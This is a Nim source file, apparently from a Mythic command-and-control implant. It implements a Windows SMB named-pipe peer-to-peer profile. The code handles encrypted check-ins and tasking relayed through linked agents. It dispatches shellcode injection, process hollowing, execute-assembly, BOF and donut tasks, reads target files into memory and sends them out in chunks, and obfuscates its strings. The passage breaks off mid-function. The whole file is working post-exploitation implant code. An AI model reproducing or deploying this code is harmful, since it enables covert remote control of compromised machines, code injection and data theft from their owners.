when not defined(windows):
  {.error: "SMB profile is only supported on Windows".}

import std/[base64, strutils, json, random, os, asyncdispatch, tables]
import ../config
import ../utils/crypto
import ../utils/debug
import ../utils/strenc
import ../utils/task_processor
import ../tasks/download
import ../tasks/upload
import ../tasks/connect
import ../tasks/link

# Import Windows-specific tasks for chunk processing
import ../tasks/execute_assembly
import ../tasks/inline_execute
import ../tasks/shinject
import ../tasks/donut
import ../tasks/inject_hollow

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]

when encryptedExchange:
  import ../utils/key_exchange

# Forward declaration for Agent type (defined in agent.nim)
type Agent* = object

# Background task types for P2P agent
type
  BackgroundTaskType = enum
    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
    fileData: seq[byte]
    params: JsonNode  # Store original params for file-based tasks

# Windows named pipe handle
type
  HANDLE = int
  DWORD = uint32
  BOOL = int32
  LPCWSTR = WideCString
  LPOVERLAPPED = pointer
  LPDWORD = ptr DWORD
  LPVOID = pointer
  LPCVOID = pointer

const
  PIPE_ACCESS_DUPLEX = 0x00000003
  FILE_FLAG_OVERLAPPED = 0x40000000
  PIPE_TYPE_BYTE = 0x00000000
  PIPE_TYPE_MESSAGE = 0x00000004
  PIPE_READMODE_MESSAGE = 0x00000002
  PIPE_WAIT = 0x00000000
  PIPE_NOWAIT = 0x00000001
  PIPE_UNLIMITED_INSTANCES = 255
  NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
  INVALID_HANDLE_VALUE = -1
  ERROR_PIPE_CONNECTED = 535
  ERROR_IO_PENDING = 997
  ERROR_NO_DATA = 232
  INFINITE = 0xFFFFFFFF'u32

{.push importc, stdcall, dynlib: "kernel32".}
proc CreateNamedPipeW(
  lpName: LPCWSTR,
  dwOpenMode: DWORD,
  dwPipeMode: DWORD,
  nMaxInstances: DWORD,
  nOutBufferSize: DWORD,
  nInBufferSize: DWORD,
  nDefaultTimeOut: DWORD,
  lpSecurityAttributes: pointer
): HANDLE

proc ConnectNamedPipe(hNamedPipe: HANDLE, lpOverlapped: LPOVERLAPPED): BOOL
proc DisconnectNamedPipe(hNamedPipe: HANDLE): BOOL
proc CloseHandle(hObject: HANDLE): BOOL
proc ReadFile(hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, 
              lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
proc WriteFile(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD,
               lpNumberOfBytesWritten: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
proc FlushFileBuffers(hFile: HANDLE): BOOL
proc GetLastError(): DWORD
proc PeekNamedPipe(hNamedPipe: HANDLE, lpBuffer: LPVOID, nBufferSize: DWORD,
                   lpBytesRead: LPDWORD, lpTotalBytesAvail: LPDWORD, 
                   lpBytesLeftThisMessage: LPDWORD): BOOL
{.pop.}

type
  SmbProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]
    pipeName: string
    pipeHandle: HANDLE
    listening: bool
    callbackUuid*: string

proc newSmbProfile*(): SmbProfile =
  ## Create a new SMB P2P profile (listener)
  result = SmbProfile()
  result.config = getConfig()
  
  # Generate random pipe name if not specified
  let pipeName = if result.config.pipename.len > 0: 
    result.config.pipename
  else:
    "cb_pipe_" & $rand(100000000..999999999)
  
  result.pipeName = pipeName
  result.pipeHandle = INVALID_HANDLE_VALUE
  result.listening = false
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  
  debug "[DEBUG] SMB P2P Profile: Created (will listen on pipe: ", result.pipeName, ")"

proc sendChunkedMessage(pipeHandle: HANDLE, message: string): bool =
  ## Send a chunked message (12-byte header + data per chunk)
  ## Header: chunk_length (4 bytes) + total_chunks (4 bytes) + chunk_index (4 bytes)
  const CHUNK_SIZE = 1024
  let messageLen = message.len
  let totalChunks = (messageLen + CHUNK_SIZE - 1) div CHUNK_SIZE
  
  debug "[DEBUG] SMB P2P: Sending message in ", totalChunks, " chunks (", messageLen, " bytes total)"
  
  for chunkIndex in 0..<totalChunks:
    let startPos = chunkIndex * CHUNK_SIZE
    let endPos = min(startPos + CHUNK_SIZE, messageLen)
    let chunkData = message[startPos..<endPos]
    let chunkDataLen = chunkData.len
    
    # Build chunk header: chunk_length (12 + data) + total_chunks + chunk_index
    let chunkLength = (12 + chunkDataLen).uint32
    
    var headerBytes: array[12, byte]
    # chunk_length (big-endian)
    headerBytes[0] = byte((chunkLength shr 24) and 0xFF)
    headerBytes[1] = byte((chunkLength shr 16) and 0xFF)
    headerBytes[2] = byte((chunkLength shr 8) and 0xFF)
    headerBytes[3] = byte(chunkLength and 0xFF)
    
    # total_chunks (big-endian)
    let totalChunksU32 = totalChunks.uint32
    headerBytes[4] = byte((totalChunksU32 shr 24) and 0xFF)
    headerBytes[5] = byte((totalChunksU32 shr 16) and 0xFF)
    headerBytes[6] = byte((totalChunksU32 shr 8) and 0xFF)
    headerBytes[7] = byte(totalChunksU32 and 0xFF)
    
    # chunk_index (big-endian)
    let chunkIndexU32 = chunkIndex.uint32
    headerBytes[8] = byte((chunkIndexU32 shr 24) and 0xFF)
    headerBytes[9] = byte((chunkIndexU32 shr 16) and 0xFF)
    headerBytes[10] = byte((chunkIndexU32 shr 8) and 0xFF)
    headerBytes[11] = byte(chunkIndexU32 and 0xFF)
    
    debug "[DEBUG] SMB P2P: Sending chunk ", chunkIndex + 1, "/", totalChunks, " (", chunkDataLen, " bytes)"
    
    # Write header
    var bytesWritten: DWORD = 0
    if WriteFile(pipeHandle, addr headerBytes[0], 12, addr bytesWritten, nil) == 0:
      debug "[DEBUG] SMB P2P: Failed to write chunk header, error: ", GetLastError()
      return false
    
    # Write chunk data
    if chunkDataLen > 0:
      bytesWritten = 0
      if WriteFile(pipeHandle, unsafeAddr chunkData[0], chunkDataLen.DWORD, addr bytesWritten, nil) == 0:
        debug "[DEBUG] SMB P2P: Failed to write chunk data, error: ", GetLastError()
        return false
  
  # Flush to ensure all data is sent
  discard FlushFileBuffers(pipeHandle)
  debug "[DEBUG] SMB P2P: Message sent successfully"
  return true

proc receiveChunkedMessage(pipeHandle: HANDLE): string =
  ## Receive a chunked message
  var messageBuffer = ""
  var totalChunks: uint32 = 0
  var receivedChunks: uint32 = 0
  
  while true:
    # Read 12-byte metadata header
    var headerBytes: array[12, byte]
    var bytesRead: DWORD = 0
    
    debug "[DEBUG] SMB P2P: About to call ReadFile for header (pipeHandle=", pipeHandle, ")"
    let readResult = ReadFile(pipeHandle, addr headerBytes[0], 12, addr bytesRead, nil)
    let lastErr = GetLastError()
    debug "[DEBUG] SMB P2P: ReadFile returned ", readResult, ", bytesRead=", bytesRead, ", lastError=", lastErr
    
    if readResult == 0:
      debug "[DEBUG] SMB P2P: Failed to read chunk header, error: ", lastErr
      return ""
    
    if bytesRead != 12:
      debug "[DEBUG] SMB P2P: Incomplete chunk header read: ", bytesRead, " bytes"
      return ""
    
    # Parse header (big-endian)
    let chunkLength = (headerBytes[0].uint32 shl 24) or 
                      (headerBytes[1].uint32 shl 16) or 
                      (headerBytes[2].uint32 shl 8) or 
                      headerBytes[3].uint32
    
    totalChunks = (headerBytes[4].uint32 shl 24) or 
                  (headerBytes[5].uint32 shl 16) or 
                  (headerBytes[6].uint32 shl 8) or 
                  headerBytes[7].uint32
    
    let chunkIndex = (headerBytes[8].uint32 shl 24) or 
                     (headerBytes[9].uint32 shl 16) or 
                     (headerBytes[10].uint32 shl 8) or 
                     headerBytes[11].uint32
    
    if chunkIndex >= totalChunks:
      debug "[DEBUG] SMB P2P: Invalid chunk index: ", chunkIndex
      return ""
    
    # Read chunk data
    let chunkDataLen = (chunkLength - 12).int
    if chunkDataLen < 0 or chunkDataLen > 100_000_000:
      debug "[DEBUG] SMB P2P: Invalid chunk data length: ", chunkDataLen
      return ""
    
    var chunkData = newString(chunkDataLen)
    bytesRead = 0
    
    if chunkDataLen > 0:
      if ReadFile(pipeHandle, addr chunkData[0], chunkDataLen.DWORD, addr bytesRead, nil) == 0:
        debug "[DEBUG] SMB P2P: Failed to read chunk data, error: ", GetLastError()
        return ""
      
      if bytesRead.int != chunkDataLen:
        debug "[DEBUG] SMB P2P: Incomplete chunk data read: ", bytesRead, " bytes"
        return ""
    
    messageBuffer.add(chunkData)
    receivedChunks += 1
    
    debug "[DEBUG] SMB P2P: Received chunk ", receivedChunks, "/", totalChunks
    
    if receivedChunks == totalChunks:
      break
  
  debug "[DEBUG] SMB P2P: Received complete message (", messageBuffer.len, " bytes)"
  return messageBuffer

proc encryptMessage(profile: SmbProfile, message: string, uuid: string): string =
  ## Encrypt a message with AES or just base64 encode if no key
  if profile.aesKey.len > 0 and uuid.len > 0:
    debug "[DEBUG] SMB P2P: Encrypting message with AES-256-CBC+HMAC"
    result = encryptPayload(message, profile.aesKey, uuid)
  else:
    debug "[DEBUG] SMB P2P: Encoding message (no encryption)"
    result = encode(uuid & message)

proc decryptMessage(profile: SmbProfile, message: string): string =
  ## Decrypt a message with AES or just base64 decode if no key
  if profile.aesKey.len > 0:
    debug "[DEBUG] SMB P2P: Decrypting message with AES-256-CBC+HMAC"
    result = decryptPayload(message, profile.aesKey)
  else:
    debug "[DEBUG] SMB P2P: Decoding message (no encryption)"
    let decoded = decode(message)
    if decoded.len > 36:
      result = decoded[36..^1]
    else:
      result = ""

proc sendDownloadChunk(taskId: string, fileId: string, path: string, fileData: seq[byte], chunkNum: int, totalChunks: int): JsonNode =
  ## Send a download chunk response for a P2P agent
  const CHUNK_SIZE = 512000
  
  try:
    let offset = chunkNum * CHUNK_SIZE
    let remaining = fileData.len - offset
    let chunkSize = min(remaining, CHUNK_SIZE)
    
    if chunkSize <= 0 or offset >= fileData.len:
      # No more data to send - use completeDownload for proper completion
      return completeDownload(taskId, fileId, path)
    
    # Extract chunk data
    var chunkData = newSeq[byte](chunkSize)
    for i in 0..<chunkSize:
      chunkData[i] = fileData[offset + i]
    
    # Encode to base64
    let encodedChunk = encode(cast[string](chunkData))
    
    let chunkResponse = %*{
      obf("chunk_num"): chunkNum + 1,
      obf("file_id"): "",  # File ID will be provided by Mythic
      obf("chunk_data"): encodedChunk,
      obf("chunk_size"): chunkSize
    }
    
    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): "Error reading chunk: " & e.msg
    }

proc forwardIncomingDelegatesSmb*(msgJson: JsonNode) =
  ## Forward any incoming delegates from a message to downstream P2P agents
  ## This enables multi-level P2P chaining (e.g., HTTP <- TCP <- SMB)
  if msgJson.hasKey(obf("delegates")):
    let delegates = msgJson[obf("delegates")]
    for delegate in delegates:
      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
        let delegateUuid = delegate[obf("uuid")].getStr()
        let delegateMsg = delegate[obf("message")].getStr()
        debug "[DEBUG] SMB P2P: Forwarding delegate to downstream agent ", delegateUuid
        discard forwardDelegateToConnect(delegateUuid, delegateMsg)
        discard forwardDelegateToLink(delegateUuid, delegateMsg)
        # Handle rekeying if Mythic assigned a new UUID
        if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
          let newUuid = if delegate.hasKey(obf("new_uuid")):
            delegate[obf("new_uuid")].getStr()
          else:
            delegate[obf("mythic_uuid")].getStr()
          if newUuid != delegateUuid:
            debug "[DEBUG] SMB P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
            discard rekeyConnectConnection(delegateUuid, newUuid)
            discard rekeyLinkConnection(delegateUuid, newUuid)

proc collectDownstreamDelegatesSmb*(): tuple[delegates: JsonNode, edges: JsonNode] =
  ## Collect delegate and edge data from all downstream P2P connections
  var delegates = newJArray()
  var edges = newJArray()
  
  let connectResps = checkActiveConnectConnections()
  for resp in connectResps:
    if resp.hasKey(obf("delegates")):
      for d in resp[obf("delegates")]:
        delegates.add(d)
    elif resp.hasKey(obf("edges")):
      for e in resp[obf("edges")]:
        edges.add(e)
  
  let linkResps = checkActiveLinkConnections()
  for resp in linkResps:
    if resp.hasKey(obf("delegates")):
      for d in resp[obf("delegates")]:
        delegates.add(d)
    elif resp.hasKey(obf("edges")):
      for e in resp[obf("edges")]:
        edges.add(e)
  
  return (delegates, edges)

proc startListening*(profile: SmbProfile): bool =
  ## Start listening on the named pipe
  if profile.listening:
    debug "[DEBUG] SMB P2P: Already listening"
    return true
  
  try:
    let pipePath = r"\\.\pipe\" & profile.pipeName
    let wPipePath = newWideCString(pipePath)
    
    debug "[DEBUG] SMB P2P: Creating named pipe: ", pipePath
    
    profile.pipeHandle = CreateNamedPipeW(
      wPipePath,
      PIPE_ACCESS_DUPLEX,
      PIPE_TYPE_BYTE or PIPE_WAIT,
      PIPE_UNLIMITED_INSTANCES,
      65536,  # Out buffer size (increased)
      65536,  # In buffer size (increased)
      NMPWAIT_USE_DEFAULT_WAIT,
      nil
    )
    
    if profile.pipeHandle == INVALID_HANDLE_VALUE:
      debug "[DEBUG] SMB P2P: Failed to create named pipe, error: ", GetLastError()
      return false
    
    profile.listening = true
    debug "[DEBUG] SMB P2P: Named pipe created successfully"
    return true
    
  except Exception as e:
    debug "[DEBUG] SMB P2P: Exception creating pipe: ", e.msg
    return false

proc send*(profile: SmbProfile, data: string, callbackUuid: string = ""): string =
  ## For SMB P2P, send is not used directly - communication happens through handleClient
  ## This is here for interface compatibility with other profiles
  debug "[DEBUG] SMB P2P: send() called but SMB is a listener profile (P2P)"
  result = ""

proc start*(profile: SmbProfile) =
  ## Start the SMB P2P listener and handle clients
  debug "[DEBUG] SMB P2P: Starting SMB listener agent on pipe: ", profile.pipeName
  
  # Start listening
  if not profile.startListening():
    debug "[DEBUG] SMB P2P: Failed to start listening, exiting"
    return
  
  debug "[DEBUG] SMB P2P: Server started, waiting for connections"
  
  # Main accept loop - runs until process exits
  while true:
    try:
      # Wait for client to connect
      debug "[DEBUG] SMB P2P: Waiting for client connection..."
      
      let connectResult = ConnectNamedPipe(profile.pipeHandle, nil)
      let lastError = GetLastError()
      
      # Check if connection succeeded
      if connectResult == 0 and lastError != ERROR_PIPE_CONNECTED.DWORD:
        debug "[DEBUG] SMB P2P: ConnectNamedPipe failed, error: ", lastError
        # Close and recreate pipe for next connection
        discard CloseHandle(profile.pipeHandle)
        profile.listening = false
        if not profile.startListening():
          debug "[DEBUG] SMB P2P: Failed to recreate pipe"
          return
        continue
      
      debug "[DEBUG] SMB P2P: Client connected"
      
      # Give client time to set up reader and writer threads
      # The linking agent now uses proper synchronization and waits
      # for threads to be ready before returning
      sleep(200)
      
      # Send checkin to link agent
      debug "[DEBUG] SMB P2P: Sending checkin to link agent"
      let checkinMsg = buildCheckinInfo()
      let checkinData = profile.encryptMessage($checkinMsg, profile.callbackUuid)
      
      if not sendChunkedMessage(profile.pipeHandle, checkinData):
        debug "[DEBUG] SMB P2P: Failed to send checkin"
        discard DisconnectNamedPipe(profile.pipeHandle)
        discard CloseHandle(profile.pipeHandle)
        profile.listening = false
        if not profile.startListening():
          return
        continue
      
      debug "[DEBUG] SMB P2P: Waiting for checkin response from Mythic (via link agent)"
      debug "[DEBUG] SMB P2P: pipeHandle=", profile.pipeHandle, ", about to call receiveChunkedMessage"
      
      # Wait for checkin response
      let checkinResp = receiveChunkedMessage(profile.pipeHandle)
      debug "[DEBUG] SMB P2P: receiveChunkedMessage returned, len=", checkinResp.len
      
      if checkinResp.len == 0:
        let lastErr = GetLastError()
        debug "[DEBUG] SMB P2P: No checkin response (error: ", lastErr, "), closing client"
        discard DisconnectNamedPipe(profile.pipeHandle)
        discard CloseHandle(profile.pipeHandle)
        profile.listening = false
        if not profile.startListening():
          return
        continue
      
      let checkinRespData = profile.decryptMessage(checkinResp)
      debug "[DEBUG] SMB P2P: Received checkin response from Mythic"
      
      # Parse checkin response to get callback UUID
      try:
        let checkinJson = parseJson(checkinRespData)
        if checkinJson.hasKey(obf("id")):
          profile.callbackUuid = checkinJson[obf("id")].getStr()
          debug "[DEBUG] SMB P2P: Callback UUID updated to: ", profile.callbackUuid
      except Exception as e:
        debug "[DEBUG] SMB P2P: Failed to parse checkin response: ", e.msg
      
      # Enter client message loop
      debug "[DEBUG] SMB P2P: Entering client message loop"
      
      var backgroundTasks = initTable[string, BackgroundTaskState]()
      var clientShouldExit = false
      
      while true:
        try:
          # Poll for data using PeekNamedPipe to avoid blocking
          var bytesAvail: DWORD = 0
          if PeekNamedPipe(profile.pipeHandle, nil, 0, nil, addr bytesAvail, nil) == 0:
            let err = GetLastError()
            debug "[DEBUG] SMB P2P: PeekNamedPipe failed, error: ", err, ", client disconnected"
            break
          
          if bytesAvail == 0:
            # No data available, sleep briefly
            sleep(100)
            continue
          
          # Data available, read it
          debug "[DEBUG] SMB P2P: ", bytesAvail, " bytes available, reading message"
          let clientMsg = receiveChunkedMessage(profile.pipeHandle)
          if clientMsg.len == 0:
            debug "[DEBUG] SMB P2P: Client disconnected"
            break
          
          debug "[DEBUG] SMB P2P: Received ", clientMsg.len, " bytes from linking agent"
          let decrypted = profile.decryptMessage(clientMsg)
          debug "[DEBUG] SMB P2P: Decrypted message (", decrypted.len, " bytes)"
          
          # Check for special actions
          try:
            let msgJson = parseJson(decrypted)
            debug "[DEBUG] SMB P2P: Parsed JSON, checking for action or responses..."
            
            # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
            forwardIncomingDelegatesSmb(msgJson)
            
            # Check for responses array (post_response from Mythic)
            if msgJson.hasKey(obf("responses")):
              debug "[DEBUG] SMB P2P: Received post_response with responses array from Mythic"
              
              let responses = msgJson[obf("responses")]
              var chunksToSend = newJArray()
              
              for resp in responses:
                let taskId = resp[obf("task_id")].getStr()
                
                # Handle chunk_data (Mythic sending file chunks for upload-type tasks)
                if resp.hasKey(obf("chunk_data")):
                  debug "[DEBUG] SMB P2P: Received chunk_data from Mythic for task ", taskId
                  
                  if backgroundTasks.hasKey(taskId):
                    var state = backgroundTasks[taskId]
                    let chunkData = resp[obf("chunk_data")].getStr()
                    let totalChunks = resp[obf("total_chunks")].getInt()
                    state.totalChunks = totalChunks
                    
                    case state.taskType
                    of btUpload:
                      let isFirstChunk = (state.currentChunk == 1)
                      let uploadResp = processUploadChunk(taskId, state.fileId, state.path,
                                                           state.currentChunk, chunkData, totalChunks, isFirstChunk)
                      chunksToSend.add(uploadResp)
                      
                      if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Upload complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btExecuteAssembly:
                      let execResp = processExecuteAssemblyChunk(
                        taskId, state.params, chunkData, totalChunks,
                        state.currentChunk, state.fileData
                      )
                      chunksToSend.add(execResp)
                      
                      if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Execute-assembly complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btInlineExecute:
                      let bofResp = processInlineExecuteChunk(
                        taskId, state.params, chunkData, totalChunks,
                        state.currentChunk, state.fileData
                      )
                      chunksToSend.add(bofResp)
                      
                      if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Inline_execute complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btShinject:
                      let injectResp = processShinjectChunk(
                        taskId, state.params, chunkData, totalChunks,
                        state.currentChunk, state.fileData
                      )
                      chunksToSend.add(injectResp)
                      
                      if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Shinject complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btDonut:
                      let donutResp = processDonutChunk(
                        taskId, state.params, chunkData, totalChunks,
                        state.currentChunk, state.fileData
                      )
                      chunksToSend.add(donutResp)
                      
                      if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Donut complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btInjectHollow:
                      let hollowResp = processInjectHollowChunk(
                        taskId, state.params, chunkData, totalChunks,
                        state.currentChunk, state.fileData
                      )
                      chunksToSend.add(hollowResp)
                      
                      if hollowResp.hasKey(obf("completed")) and hollowResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] SMB P2P: Inject hollow complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btDownload:
                      debug "[DEBUG] SMB P2P: ERROR - received chunk_data for download task!"
                  
                  continue
                
                # Handle file_id assignment and chunk acknowledgments (for download tasks)
                if resp.hasKey(obf("task_id")) and resp.hasKey(obf("file_id")):
                  let fileId = resp[obf("file_id")].getStr()
                  
                  if resp.hasKey(obf("chunk_num")):
                    let chunkNum = resp[obf("chunk_num")].getInt()
                    debug "[DEBUG] SMB P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
                    
                    if backgroundTasks.hasKey(taskId):
                      var state = backgroundTasks[taskId]
                      if state.taskType == btDownload:
                        if state.currentChunk < state.totalChunks:
                          debug "[DEBUG] SMB P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
                          let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                          
                          if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
                            chunksToSend.add(chunkResp)
                            backgroundTasks.del(taskId)
                          else:
                            if chunkResp.hasKey(obf("download")):
                              var download = chunkResp[obf("download")]
                              download[obf("file_id")] = %fileId
                              chunkResp[obf("download")] = download
                            
                            chunksToSend.add(chunkResp)
                            state.currentChunk += 1
                            backgroundTasks[taskId] = state
                        else:
                          debug "[DEBUG] SMB P2P: All chunks sent, sending final completion message"
                          let completeMsg = completeDownload(taskId, fileId, state.path)
                          chunksToSend.add(completeMsg)
                          backgroundTasks.del(taskId)
                  else:
                    # Initial file_id assignment
                    debug "[DEBUG] SMB P2P: Mythic assigned file_id ", fileId, " to task ", taskId
                    
                    if backgroundTasks.hasKey(taskId):
                      var state = backgroundTasks[taskId]
                      if state.taskType == btDownload and state.fileId.len == 0:
                        state.fileId = fileId
                        backgroundTasks[taskId] = state
                        
                        debug "[DEBUG] SMB P2P: Starting chunk uploads for download task"
                        let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                        
                        if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
                          chunksToSend.add(chunkResp)
                          backgroundTasks.del(taskId)
                        else:
                          if chunkResp.hasKey(obf("download")):
                            var download = chunkResp[obf("download")]
                            download[obf("file_id")] = %fileId
                            chunkResp[obf("download")] = download
                          
                          chunksToSend.add(chunkResp)
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
              
              # Send chunks if any
              if chunksToSend.len > 0:
                # Collect downstream delegate data (multi-level P2P)
                let (downDelegates, downEdges) = collectDownstreamDelegatesSmb()
                for e in downEdges:
                  chunksToSend.add(e)
                
                let chunkResponse = %* {
                  obf("action"): obf("post_response"),
                  obf("responses"): chunksToSend
                }
                if downDelegates.len > 0:
                  chunkResponse[obf("delegates")] = downDelegates
                  debug "[DEBUG] SMB P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                
                debug "[DEBUG] SMB P2P: Sending ", chunksToSend.len, " download chunk(s)"
                let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                continue
              
              # No chunks to send - check if there's downstream delegate data to relay
              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegatesSmb()
              if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
                let delegateResponse = %* {
                  obf("action"): obf("post_response"),
                  obf("responses"): noChunkEdges
                }
                if noChunkDelegates.len > 0:
                  delegateResponse[obf("delegates")] = noChunkDelegates
                  debug "[DEBUG] SMB P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
              continue
            
            # Check for action field
            elif msgJson.hasKey(obf("action")):
              let action = msgJson[obf("action")].getStr()
              debug "[DEBUG] SMB P2P: Received action: ", action
              
              if action == obf("checkin"):
                debug "[DEBUG] SMB P2P: Processing checkin response"
                if msgJson.hasKey(obf("status")) and msgJson[obf("status")].getStr() == "success":
                  if msgJson.hasKey(obf("id")):
                    profile.callbackUuid = msgJson[obf("id")].getStr()
                    debug "[DEBUG] SMB P2P: Updated callback UUID to: ", profile.callbackUuid
                continue
                
              elif action == obf("get_tasking"):
                debug "[DEBUG] SMB P2P: Received get_tasking response with tasks"
                
                if msgJson.hasKey(obf("tasks")):
                  let tasks = msgJson[obf("tasks")]
                  if tasks.len > 0:
                    debug "[DEBUG] SMB P2P: Received ", tasks.len, " task(s) to execute"
                    
                    var taskResponses = newJArray()
                    var shouldExit = false
                    
                    for task in tasks:
                      let taskId = task[obf("id")].getStr()
                      let command = task[obf("command")].getStr()
                      
                      # Handle background_task
                      if command == obf("background_task"):
                        debug "[DEBUG] SMB P2P: Processing background_task for ", taskId
                        
                        if backgroundTasks.hasKey(taskId):
                          var state = backgroundTasks[taskId]
                          
                          case state.taskType
                          of btDownload:
                            let chunkResponse = sendDownloadChunk(taskId, state.fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                            taskResponses.add(chunkResponse)
                            
                            if chunkResponse.hasKey(obf("completed")) and chunkResponse[obf("completed")].getBool():
                              backgroundTasks.del(taskId)
                              debug "[DEBUG] SMB P2P: Download complete"
                            else:
                              state.currentChunk += 1
                              backgroundTasks[taskId] = state
                          
                          of btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow:
                            debug "[DEBUG] SMB P2P: background_task not applicable for upload-type tasks"
                        else:
                          debug "[DEBUG] SMB P2P: No background task state for ", taskId
                        
                        continue
                      
                      # Parse parameters
                      var params = newJObject()
                      if task.hasKey(obf("parameters")):
                        let paramStr = task[obf("parameters")].getStr()
                        if paramStr.len > 0:
                          try:
                            params = parseJson(paramStr)
                          except:
                            debug "[DEBUG] Failed to parse parameters: " & paramStr
                      
                      # Execute task
                      let execResult = executeTask(taskId, command, params)
                      
                      if execResult.shouldExit:
                        debug "[DEBUG] SMB P2P: Exit command received"
                        taskResponses.add(execResult.response)
                        shouldExit = true
                        break
                      
                      # Handle download
                      if command == obf("download") and execResult.needsBackgroundTracking:
                        debug "[DEBUG] SMB P2P: Starting download"
                        taskResponses.add(execResult.response)
                        
                        var state = BackgroundTaskState(
                          taskType: btDownload,
                          path: params[obf("path")].getStr(),
                          fileId: "",
                          totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
                          currentChunk: 0,
                          fileData: @[],
                          params: newJNull()
                        )
                        
                        # Read file into memory
                        try:
                          let filePath = params[obf("path")].getStr()
                          var f: File
                          if f.open(filePath, fmRead):
                            let fileSize = f.getFileSize()
                            state.fileData = newSeq[byte](fileSize)
                            discard f.readBytes(state.fileData, 0, fileSize)
                            f.close()
                            backgroundTasks[taskId] = state
                            debug "[DEBUG] SMB P2P: File loaded, ", fileSize, " bytes"
                        except Exception as e:
                          debug "[DEBUG] SMB P2P: Failed to read file: ", e.msg
                        
                        continue
                      
                      # Handle upload
                      elif command == obf("upload") and execResult.needsBackgroundTracking:
                        debug "[DEBUG] SMB P2P: Starting upload"
                        taskResponses.add(execResult.response)
                        
                        let uploadPath = if execResult.response.hasKey(obf("upload")):
                          execResult.response[obf("upload")][obf("full_path")].getStr()
                        else:
                          params[obf("remote_path")].getStr()
                        
                        var state = BackgroundTaskState(
                          taskType: btUpload,
                          path: uploadPath,
                          fileId: params[obf("file")].getStr(),
                          totalChunks: 0,
                          currentChunk: 1,
                          fileData: @[],
                          params: newJNull()
                        )
                        backgroundTasks[taskId] = state
                        continue
                      
                      # Handle other file-receiving tasks
                      elif execResult.needsBackgroundTracking and (
                        command == obf("execute_assembly") or 
                        command == obf("inline_execute") or 
                        command == obf("shinject") or 
                        command == obf("donut") or 
                        command == obf("inject_hollow")):
                        
                        debug "[DEBUG] SMB P2P: Starting file-receiving task: ", command
                        taskResponses.add(execResult.response)
                        
                        let taskType = case command
                          of obf("execute_assembly"): btExecuteAssembly
                          of obf("inline_execute"): btInlineExecute
                          of obf("shinject"): btShinject
                          of obf("donut"): btDonut
                          of obf("inject_hollow"): btInjectHollow
                          else: btUpload
                        
                        var state = BackgroundTaskState(
                          taskType: taskType,
                          path: "",
                          fileId: params[obf("uuid")].getStr(),
                          totalChunks: 0,
                          currentChunk: 1,
                          fileData: @[],
                          params: params
                        )
                        backgroundTasks[taskId] = state
                        continue
                      
                      else:
                        taskResponses.add(execResult.response)
                    
                    # Collect downstream delegate data (multi-level P2P)
                    let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb()
                    for e in taskEdges:
                      taskResponses.add(e)
                    
                    # Send response
                    let taskingResponse = %* {
                      obf("action"): obf("post_response"),
                      obf("responses"): taskResponses
                    }
                    if taskDelegates.len > 0:
                      taskingResponse[obf("delegates")] = taskDelegates
